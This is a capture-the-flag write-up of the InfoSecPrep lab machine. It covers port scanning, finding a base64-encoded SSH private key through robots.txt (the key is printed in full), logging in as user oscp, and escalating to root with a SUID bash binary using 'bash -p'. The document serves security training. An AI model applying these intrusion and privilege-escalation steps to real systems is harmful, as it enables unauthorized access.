# InfoSecPrep writeup by Chanathip (this is my first writeup btw)
## Info-Sheet

- IP: 192.168.184.89
- DNS-Domain name: N/A
- Host name: InfoSecPrep
- OS: Linux
- Server: Apache httpd 2.4.41
- Kernel: Linux oscp 5.4.0-40-generic \#44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

---
## Recon
---
Services and ports:
```bash
# Nmap 7.91 scan initiated Fri Sep  3 17:24:39 2021 as: nmap -v -sC -sV -oN scans/nmap.txt 192.168.184.89  
Nmap scan report for 192.168.184.89  
Host is up (0.068s latency).  
Not shown: 998 closed ports  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)  
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)  
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)  
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  
|_http-generator: WordPress 5.4.2  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
| http-robots.txt: 1 disallowed entry    
|_/secret.txt  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
|_http-title: OSCP Voucher &#8211; Just another WordPress site  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Read data files from: /usr/bin/../share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Fri Sep  3 17:24:52 2021 -- 1 IP address (1 host up) scanned in 12.84 seconds
```
### Port 22 - SSH 
- Name: OpenSSH
- Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
- Takes-password: No password, RSA key only

Netcat Connection to SSH

```bash
┌─[✗]─[kenobi@cg-home]─[~/ctf/ProvingGround/Warmup/InfoSecPrep]  
└──╼ $nc 192.168.184.89 22  
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
```
```
nc 192.168.184.89 22
```

### Port 80 - Web server

- Server: Apache httpd 2.4.41
- Scripting language: php
- IP-address: 192.168.184.89
- Domain name address: N/A

```bash
curl --head http://192.168.184.89   
```
```bash
HTTP/1.1 200 OK  
Date: Fri, 03 Sep 2021 22:34:02 GMT  
Server: Apache/2.4.41 (Ubuntu)  
Link: <http://192.168.184.89/index.php/wp-json/>; rel="https://api.w.org/"  
Content-Type: text/html; charset=UTF-8
```

- Web application: Wordpress
- Name: InfoSecPrep
- Version: 5.4.2

##### /index.php
- Blogs
- Found possible username `oscp`

##### /robots.txt
- /secret.txt

##### /secret.txt
- contained base64 encoded
-  decoded value below
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----
```

- Possible ssh-key of user `oscp`

---

## exploitation

---
### Port 22 - SSH
- We try using ssh-key found against user `oscp`
##### steps
1. chmod 600 `<filename>`
2. ssh -i `<filename>` oscp@`<IP>`

Successfully Logged in

---
## PRIVILEGE ESCALATION
---

- Perform basic local enumerations

### Possible escalate routes
- SUID
- ##### steps
1. find / -perm -4000 2>/dev/null
2. Found interesting bin for priv esc --> /usr/bin/bash

#### priv esc
- ##### steps
1. Using /usr/bin/bash with SUID for priv esc
2. Go to [[https://gtfobins.github.io]]
3. Search for bash binary
4. Found `bash -p` for priv esc
5. Execute, got root bash shell

# GG!
